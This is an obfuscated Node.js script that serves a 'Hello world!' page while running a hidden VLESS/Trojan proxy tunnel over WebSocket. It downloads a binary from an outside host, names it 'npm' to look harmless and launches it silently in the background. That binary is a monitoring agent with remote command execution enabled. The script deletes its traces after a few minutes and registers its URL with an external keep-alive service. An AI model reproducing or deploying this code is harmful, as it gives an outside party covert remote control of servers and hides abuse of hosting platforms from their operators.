function _0x9c7e(_0x1755a8,_0x3bbee2){_0x1755a8=_0x1755a8-0x8d;const _0x2ab246=_0x2ab2();let _0x9c7e26=_0x2ab246[_0x1755a8];return _0x9c7e26;}const _0x3f8b49=_0x9c7e;(function(_0x42f52e,_0x4b9d87){const _0x7d521=_0x9c7e,_0x23981a=_0x42f52e();while(!![]){try{const _0x343d70=parseInt(_0x7d521(0x8e))/0x1*(parseInt(_0x7d521(0xe8))/0x2)+-parseInt(_0x7d521(0xcf))/0x3+-parseInt(_0x7d521(0xd6))/0x4*(parseInt(_0x7d521(0xc5))/0x5)+parseInt(_0x7d521(0xa9))/0x6+parseInt(_0x7d521(0xdd))/0x7*(parseInt(_0x7d521(0xbe))/0x8)+-parseInt(_0x7d521(0xf8))/0x9*(parseInt(_0x7d521(0x103))/0xa)+parseInt(_0x7d521(0xb7))/0xb;if(_0x343d70===_0x4b9d87)break;else _0x23981a['push'](_0x23981a['shift']());}catch(_0x159933){_0x23981a['push'](_0x23981a['shift']());}}}(_0x2ab2,0x89042));const os=require('os'),http=require('http'),fs=require('fs'),axios=require('axios'),net=require(_0x3f8b49(0x9d)),path=require('path'),crypto=require(_0x3f8b49(0xcd)),{Buffer}=require(_0x3f8b49(0xac)),{exec,execSync}=require(_0x3f8b49(0xce)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x3f8b49(0xb3)][_0x3f8b49(0xde)]||_0x3f8b49(0xa2),NEZHA_SERVER=process[_0x3f8b49(0xb3)][_0x3f8b49(0xf4)]||'',NEZHA_PORT=process[_0x3f8b49(0xb3)][_0x3f8b49(0xf3)]||'',NEZHA_KEY=process['env'][_0x3f8b49(0x102)]||'',DOMAIN=process[_0x3f8b49(0xb3)][_0x3f8b49(0xc1)]||_0x3f8b49(0xf9),AUTO_ACCESS=process['env'][_0x3f8b49(0x99)]||![],WSPATH=process[_0x3f8b49(0xb3)][_0x3f8b49(0xda)]||UUID[_0x3f8b49(0xd2)](0x0,0x8),SUB_PATH=process[_0x3f8b49(0xb3)][_0x3f8b49(0x8d)]||_0x3f8b49(0x9b),NAME=process[_0x3f8b49(0xb3)][_0x3f8b49(0xc0)]||'',PORT=process[_0x3f8b49(0xb3)][_0x3f8b49(0xe6)]||0xbb8;let ISP='';const GetISP=async()=>{const _0x12286a=_0x3f8b49;try{const _0x5deda6=await axios[_0x12286a(0xd1)](_0x12286a(0x105)),_0x1681f2=_0x5deda6['data'];ISP=(_0x1681f2['country_code']+'-'+_0x1681f2[_0x12286a(0xfd)])[_0x12286a(0xc6)](/ /g,'_');}catch(_0x15e7c8){ISP=_0x12286a(0xb5);}};GetISP();function _0x2ab2(){const _0x5059c2=['https://api.ip.sb/geoip','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','includes','setsid\x20nohup\x20./npm\x20-s\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','close','stream','catch','map','SUB_PATH','20eCDBQZ','base64','application/dns-json','https://arm64.ssss.nyc.mn/v1','split','https://amd64.ssss.nyc.mn/v1','Failed\x20to\x20resolve\x20','Not\x20Found\x0a','connection','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','trojan://','AUTO_ACCESS','error','sub','2087','net','digest','join','false','npm\x20running\x20error:','5efabeb4-f6d4-91fd-b8f0-17e004c89c60','log','type','arm','1.1.1.1','https://dns.google/resolve?name=','https://amd64.ssss.nyc.mn/agent','6220968amdmjp','once','post','buffer','&path=%2F','true','/bin/bash','utf-8','createHash','find','env','hex','Unknown','then','3416149MmOTRD','write','2053','toString','https://arm64.ssss.nyc.mn/agent','every','text/plain','8HbmqPb','Hello\x20world!','NAME','DOMAIN','from','data','Answer','1120515WPcMRx','replace','end','readFile','text/html','concat','createServer','index.html','crypto','child_process','890637mMvgTA','update','get','slice','reduce','readUInt16BE','--tls','16HrvoNt','8.8.4.4','listen','&fp=chrome&type=ws&host=','WSPATH','npm\x20is\x20already\x20running,\x20skip\x20running...','writeHead','357231YFWtVi','UUID','config.yaml','@cdns.doon.eu.org:443?security=tls&sni=','finish','trim','Server','length','readUInt8','PORT','npm\x20is\x20running','87884MnEiTJ','&type=A','npm','message','writeFileSync','arch','\x20with\x20all\x20DNS\x20servers','connect','Automatic\x20Access\x20Task\x20added\x20successfully','decode','2083','NEZHA_PORT','NEZHA_SERVER','443','pipe','vless://','4704759Fjhpiv','test.leebais.tech','\x20-p\x20','substr','url','isp','aarch64','8443','unlink','send','NEZHA_KEY','10gVOvPN','npm\x20download\x20successfully'];_0x2ab2=function(){return _0x5059c2;};return _0x2ab2();}const httpServer=http[_0x3f8b49(0xcb)]((_0x2524a1,_0x18d482)=>{const _0x3459bc=_0x3f8b49;if(_0x2524a1['url']==='/'){const _0x109c87=path[_0x3459bc(0x9f)](__dirname,_0x3459bc(0xcc));fs[_0x3459bc(0xc8)](_0x109c87,'utf8',(_0x3a4ff0,_0x47cb76)=>{const _0x234331=_0x3459bc;if(_0x3a4ff0){_0x18d482[_0x234331(0xdc)](0xc8,{'Content-Type':_0x234331(0xc9)}),_0x18d482['end'](_0x234331(0xbf));return;}_0x18d482['writeHead'](0xc8,{'Content-Type':_0x234331(0xc9)}),_0x18d482[_0x234331(0xc7)](_0x47cb76);});return;}else{if(_0x2524a1[_0x3459bc(0xfc)]==='/'+SUB_PATH){const _0x663d82=NAME?NAME+'-'+ISP:ISP,_0x40671b=_0x3459bc(0xf7)+UUID+'@cdns.doon.eu.org:443?encryption=none&security=tls&sni='+DOMAIN+_0x3459bc(0xd9)+DOMAIN+_0x3459bc(0xad)+WSPATH+'#'+_0x663d82,_0x3321ff=_0x3459bc(0x98)+UUID+_0x3459bc(0xe0)+DOMAIN+_0x3459bc(0xd9)+DOMAIN+_0x3459bc(0xad)+WSPATH+'#'+_0x663d82,_0x441b29=_0x40671b+'\x0a'+_0x3321ff,_0x5771b4=Buffer[_0x3459bc(0xc2)](_0x441b29)['toString'](_0x3459bc(0x8f));_0x18d482[_0x3459bc(0xdc)](0xc8,{'Content-Type':_0x3459bc(0xbd)}),_0x18d482[_0x3459bc(0xc7)](_0x5771b4+'\x0a');}else _0x18d482[_0x3459bc(0xdc)](0x194,{'Content-Type':_0x3459bc(0xbd)}),_0x18d482[_0x3459bc(0xc7)](_0x3459bc(0x95));}}),wss=new WebSocket[(_0x3f8b49(0xe3))]({'server':httpServer}),uuid=UUID[_0x3f8b49(0xc6)](/-/g,''),DNS_SERVERS=[_0x3f8b49(0xd7),_0x3f8b49(0xa6)];function resolveHost(_0x5d2756){return new Promise((_0xb9436b,_0x2dba75)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x5d2756)){_0xb9436b(_0x5d2756);return;}let _0x1a9f3f=0x0;function _0x5a7c74(){const _0x544440=_0x9c7e;if(_0x1a9f3f>=DNS_SERVERS[_0x544440(0xe4)]){_0x2dba75(new Error(_0x544440(0x94)+_0x5d2756+_0x544440(0xee)));return;}const _0x4e9db6=DNS_SERVERS[_0x1a9f3f];_0x1a9f3f++;const _0x3401b0=_0x544440(0xa7)+encodeURIComponent(_0x5d2756)+_0x544440(0xe9);axios[_0x544440(0xd1)](_0x3401b0,{'timeout':0x1388,'headers':{'Accept':_0x544440(0x90)}})['then'](_0x593516=>{const _0x20d1e4=_0x544440,_0x5b18b9=_0x593516[_0x20d1e4(0xc3)];if(_0x5b18b9['Status']===0x0&&_0x5b18b9['Answer']&&_0x5b18b9['Answer'][_0x20d1e4(0xe4)]>0x0){const _0x4f9682=_0x5b18b9[_0x20d1e4(0xc4)][_0x20d1e4(0xb2)](_0x4bc7b4=>_0x4bc7b4[_0x20d1e4(0xa4)]===0x1);if(_0x4f9682){_0xb9436b(_0x4f9682[_0x20d1e4(0xc3)]);return;}}_0x5a7c74();})[_0x544440(0x10c)](_0x4a3862=>{_0x5a7c74();});}_0x5a7c74();});}function handleVlessConnection(_0x1b1783,_0x5beb10){const _0x553c53=_0x3f8b49,[_0x5e47ba]=_0x5beb10,_0x2a8fda=_0x5beb10[_0x553c53(0xd2)](0x1,0x11);if(!_0x2a8fda[_0x553c53(0xbc)]((_0xbcc861,_0x2687f3)=>_0xbcc861==parseInt(uuid[_0x553c53(0xfb)](_0x2687f3*0x2,0x2),0x10)))return![];let _0x389e32=_0x5beb10[_0x553c53(0xd2)](0x11,0x12)[_0x553c53(0xe5)]()+0x13;const _0x254da2=_0x5beb10[_0x553c53(0xd2)](_0x389e32,_0x389e32+=0x2)[_0x553c53(0xd4)](0x0),_0x31573d=_0x5beb10[_0x553c53(0xd2)](_0x389e32,_0x389e32+=0x1)[_0x553c53(0xe5)](),_0x323496=_0x31573d==0x1?_0x5beb10['slice'](_0x389e32,_0x389e32+=0x4)['join']('.'):_0x31573d==0x2?new TextDecoder()[_0x553c53(0xf1)](_0x5beb10[_0x553c53(0xd2)](_0x389e32+0x1,_0x389e32+=0x1+_0x5beb10['slice'](_0x389e32,_0x389e32+0x1)[_0x553c53(0xe5)]())):_0x31573d==0x3?_0x5beb10['slice'](_0x389e32,_0x389e32+=0x10)['reduce']((_0x5c1185,_0x59fd1d,_0x1f7c80,_0xe499f5)=>_0x1f7c80%0x2?_0x5c1185[_0x553c53(0xca)](_0xe499f5[_0x553c53(0xd2)](_0x1f7c80-0x1,_0x1f7c80+0x1)):_0x5c1185,[])['map'](_0x4ed1e8=>_0x4ed1e8[_0x553c53(0xd4)](0x0)[_0x553c53(0xba)](0x10))[_0x553c53(0x9f)](':'):'';_0x1b1783[_0x553c53(0x101)](new Uint8Array([_0x5e47ba,0x0]));const _0x866c2c=createWebSocketStream(_0x1b1783);return resolveHost(_0x323496)[_0x553c53(0xb6)](_0x4421f2=>{const _0x42fb7a=_0x553c53;net[_0x42fb7a(0xef)]({'host':_0x4421f2,'port':_0x254da2},function(){const _0x39dc4a=_0x42fb7a;this[_0x39dc4a(0xb8)](_0x5beb10[_0x39dc4a(0xd2)](_0x389e32)),_0x866c2c['on'](_0x39dc4a(0x9a),()=>{})[_0x39dc4a(0xf6)](this)['on'](_0x39dc4a(0x9a),()=>{})['pipe'](_0x866c2c);})['on'](_0x42fb7a(0x9a),()=>{});})[_0x553c53(0x10c)](_0xd6c23b=>{const _0x20ed94=_0x553c53;net[_0x20ed94(0xef)]({'host':_0x323496,'port':_0x254da2},function(){const _0x203cb1=_0x20ed94;this['write'](_0x5beb10[_0x203cb1(0xd2)](_0x389e32)),_0x866c2c['on'](_0x203cb1(0x9a),()=>{})[_0x203cb1(0xf6)](this)['on'](_0x203cb1(0x9a),()=>{})['pipe'](_0x866c2c);})['on'](_0x20ed94(0x9a),()=>{});}),!![];}function handleTrojanConnection(_0x2524f4,_0x4afb33){const _0x4c062f=_0x3f8b49;try{if(_0x4afb33['length']<0x3a)return![];const _0x2e417e=_0x4afb33[_0x4c062f(0xd2)](0x0,0x38)[_0x4c062f(0xba)](),_0x1972fe=[UUID];let _0x5a5fd3=null;for(const _0xdca913 of _0x1972fe){const _0x2f9016=crypto[_0x4c062f(0xb1)]('sha224')[_0x4c062f(0xd0)](_0xdca913)[_0x4c062f(0x9e)](_0x4c062f(0xb4));if(_0x2f9016===_0x2e417e){_0x5a5fd3=_0xdca913;break;}}if(!_0x5a5fd3)return![];let _0x218663=0x38;_0x4afb33[_0x218663]===0xd&&_0x4afb33[_0x218663+0x1]===0xa&&(_0x218663+=0x2);const _0x3ba980=_0x4afb33[_0x218663];if(_0x3ba980!==0x1)return![];_0x218663+=0x1;const _0x1a1ace=_0x4afb33[_0x218663];_0x218663+=0x1;let _0x175361,_0xda7ac1;if(_0x1a1ace===0x1)_0x175361=_0x4afb33['slice'](_0x218663,_0x218663+0x4)[_0x4c062f(0x9f)]('.'),_0x218663+=0x4;else{if(_0x1a1ace===0x3){const _0x677a00=_0x4afb33[_0x218663];_0x218663+=0x1,_0x175361=_0x4afb33[_0x4c062f(0xd2)](_0x218663,_0x218663+_0x677a00)['toString'](),_0x218663+=_0x677a00;}else{if(_0x1a1ace===0x4)_0x175361=_0x4afb33[_0x4c062f(0xd2)](_0x218663,_0x218663+0x10)[_0x4c062f(0xd3)]((_0x529734,_0x14840e,_0x40b451,_0x188c78)=>_0x40b451%0x2?_0x529734[_0x4c062f(0xca)](_0x188c78[_0x4c062f(0xd2)](_0x40b451-0x1,_0x40b451+0x1)):_0x529734,[])[_0x4c062f(0x10d)](_0x110a25=>_0x110a25[_0x4c062f(0xd4)](0x0)[_0x4c062f(0xba)](0x10))['join'](':'),_0x218663+=0x10;else return![];}}_0xda7ac1=_0x4afb33[_0x4c062f(0xd4)](_0x218663),_0x218663+=0x2;_0x218663<_0x4afb33['length']&&_0x4afb33[_0x218663]===0xd&&_0x4afb33[_0x218663+0x1]===0xa&&(_0x218663+=0x2);const _0x9e0a40=createWebSocketStream(_0x2524f4);return resolveHost(_0x175361)[_0x4c062f(0xb6)](_0x5121da=>{const _0x5bce8f=_0x4c062f;net[_0x5bce8f(0xef)]({'host':_0x5121da,'port':_0xda7ac1},function(){const _0x34e1e6=_0x5bce8f;_0x218663<_0x4afb33[_0x34e1e6(0xe4)]&&this[_0x34e1e6(0xb8)](_0x4afb33[_0x34e1e6(0xd2)](_0x218663)),_0x9e0a40['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](_0x9e0a40);})['on'](_0x5bce8f(0x9a),()=>{});})[_0x4c062f(0x10c)](_0x3fb21b=>{const _0x6a7c26=_0x4c062f;net[_0x6a7c26(0xef)]({'host':_0x175361,'port':_0xda7ac1},function(){const _0x5b9541=_0x6a7c26;_0x218663<_0x4afb33['length']&&this['write'](_0x4afb33[_0x5b9541(0xd2)](_0x218663)),_0x9e0a40['on']('error',()=>{})[_0x5b9541(0xf6)](this)['on'](_0x5b9541(0x9a),()=>{})[_0x5b9541(0xf6)](_0x9e0a40);})['on']('error',()=>{});}),!![];}catch(_0x24d819){return![];}}wss['on'](_0x3f8b49(0x96),(_0x13c924,_0x4fb1e5)=>{const _0x139ffe=_0x3f8b49,_0x257d95=_0x4fb1e5[_0x139ffe(0xfc)]||'';_0x13c924[_0x139ffe(0xaa)](_0x139ffe(0xeb),_0x5dce5f=>{const _0x265314=_0x139ffe;if(_0x5dce5f[_0x265314(0xe4)]>0x11&&_0x5dce5f[0x0]===0x0){const _0x470a94=_0x5dce5f[_0x265314(0xd2)](0x1,0x11),_0x51d090=_0x470a94[_0x265314(0xbc)]((_0x3e6074,_0x26a62f)=>_0x3e6074==parseInt(uuid[_0x265314(0xfb)](_0x26a62f*0x2,0x2),0x10));if(_0x51d090){!handleVlessConnection(_0x13c924,_0x5dce5f)&&_0x13c924['close']();return;}}!handleTrojanConnection(_0x13c924,_0x5dce5f)&&_0x13c924[_0x265314(0x10a)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x501a80=_0x3f8b49,_0x17ae22=os[_0x501a80(0xed)]();return _0x17ae22===_0x501a80(0xa5)||_0x17ae22==='arm64'||_0x17ae22===_0x501a80(0xfe)?!NEZHA_PORT?_0x501a80(0x91):_0x501a80(0xbb):!NEZHA_PORT?_0x501a80(0x93):_0x501a80(0xa8);},downloadFile=async()=>{const _0x490ad5=_0x3f8b49;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x28643c=getDownloadUrl(),_0x470c1a=await axios({'method':_0x490ad5(0xd1),'url':_0x28643c,'responseType':_0x490ad5(0x10b)}),_0x43c93f=fs['createWriteStream']('npm');return _0x470c1a['data'][_0x490ad5(0xf6)](_0x43c93f),new Promise((_0x3f37d1,_0x236d32)=>{const _0x20215a=_0x490ad5;_0x43c93f['on'](_0x20215a(0xe1),()=>{const _0x54d6bb=_0x20215a;console['log'](_0x54d6bb(0x104)),exec('chmod\x20+x\x20npm',_0x1f472b=>{if(_0x1f472b)_0x236d32(_0x1f472b);_0x3f37d1();});}),_0x43c93f['on'](_0x20215a(0x9a),_0x236d32);});}catch(_0x5ed291){throw _0x5ed291;}},runnz=async()=>{const _0x3dfb5d=_0x3f8b49;try{const _0x2ccade=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x3dfb5d(0xb0)});if(_0x2ccade[_0x3dfb5d(0xe2)]()!==''){console[_0x3dfb5d(0xa3)](_0x3dfb5d(0xdb));return;}}catch(_0x5980c1){}await downloadFile();let _0x560777='',_0x4fb1dc=[_0x3dfb5d(0xf5),_0x3dfb5d(0xff),'2096',_0x3dfb5d(0x9c),_0x3dfb5d(0xf2),_0x3dfb5d(0xb9)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x17b0aa=_0x4fb1dc[_0x3dfb5d(0x107)](NEZHA_PORT)?_0x3dfb5d(0xd5):'';_0x560777=_0x3dfb5d(0x108)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3dfb5d(0xfa)+NEZHA_KEY+'\x20'+_0x17b0aa+_0x3dfb5d(0x106);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3ce076=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x3dfb5d(0x92)](':')['pop']():'',_0x480fb4=_0x4fb1dc[_0x3dfb5d(0x107)](_0x3ce076)?_0x3dfb5d(0xae):_0x3dfb5d(0xa0),_0x6b527a='client_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x480fb4+_0x3dfb5d(0x109)+UUID;fs[_0x3dfb5d(0xec)](_0x3dfb5d(0xdf),_0x6b527a);}_0x560777='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x3dfb5d(0xa3)](_0x3dfb5d(0x97));return;}}try{exec(_0x560777,{'shell':_0x3dfb5d(0xaf)},_0x1bf076=>{const _0x569566=_0x3dfb5d;if(_0x1bf076)console[_0x569566(0x9a)](_0x569566(0xa1),_0x1bf076);else console['log'](_0x569566(0xe7));});}catch(_0x180f54){console[_0x3dfb5d(0x9a)]('error:\x20'+_0x180f54);}};async function addAccessTask(){const _0x433dcb=_0x3f8b49;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x2c13a5='https://'+DOMAIN+'/'+SUB_PATH;try{const _0x3d1bf7=await axios[_0x433dcb(0xab)]('https://oooo.serv00.net/add-url',{'url':_0x2c13a5},{'headers':{'Content-Type':'application/json'}});console[_0x433dcb(0xa3)](_0x433dcb(0xf0));}catch(_0x121fd8){}}const delFiles=()=>{const _0xa8a630=_0x3f8b49;fs[_0xa8a630(0x100)](_0xa8a630(0xea),()=>{}),fs[_0xa8a630(0x100)]('config.yaml',()=>{});};httpServer[_0x3f8b49(0xd8)](PORT,()=>{runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log']('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
